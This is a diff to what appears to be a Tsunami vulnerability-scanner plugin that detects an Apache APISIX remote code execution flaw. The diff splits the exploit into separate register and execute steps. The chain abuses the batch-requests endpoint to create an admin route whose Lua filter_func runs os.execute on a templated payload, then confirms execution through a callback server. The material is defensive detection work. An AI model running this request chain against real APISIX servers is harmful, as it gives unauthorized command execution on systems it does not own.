@@ -39,7 +39,7 @@ finding: {
 ###########
 
 actions: {
-  name: "register_and_execute_route"
+  name: "register_route"
   http_request: {
     method: POST
     uri: "/apisix/batch-requests"
@@ -56,10 +56,6 @@ actions: {
       '      "path": "/apisix/admin/routes/tsunami_rce?ttl=30",'
       '      "method": "PUT",'
       '      "body": "{\\"uri\\":\\"/tsunami_rce/{{ T_UTL_CURRENT_TIMESTAMP_MS }}\\",\\"upstream\\":{\\"type\\":\\"roundrobin\\",\\"nodes\\":{}},\\"name\\":\\"{{ T_UTL_CURRENT_TIMESTAMP_MS }}\\",\\"filter_func\\":\\"{{ PIPE_REQ_FILTER_FUNC }}\\"}"'
-      '    },'
-      '    {'
-      '      "path": "/apisix/admin/routes/tsunami_rce?ttl=30",'
-      '      "method": "GET"'
       '    }'
       '  ]'
       '}'
@@ -73,6 +69,17 @@ actions: {
   }
   cleanup_actions: "cleanup_route"
 }
+
+# trigger the route to execute
+
+actions: {
+  name: "execute_route"
+  http_request: {
+    method: GET
+    uri: "/tsunami_rce/{{ T_UTL_CURRENT_TIMESTAMP_MS }}"
+  }
+}
+
 
 # the cleanup action also exploits the batch requests endpoint
 
@@ -128,7 +135,9 @@ workflows: {
     { name: "PIPE_REQ_FILTER_FUNC" value: "function(vars) os.execute('{{ PAYLOAD }}'); return true end" }
   ]
   actions: [
-    "register_and_execute_route",
+    "register_route",
+    "sleep",
+    "execute_route",
     "sleep",
     "check_callback_server_logs"
   ]
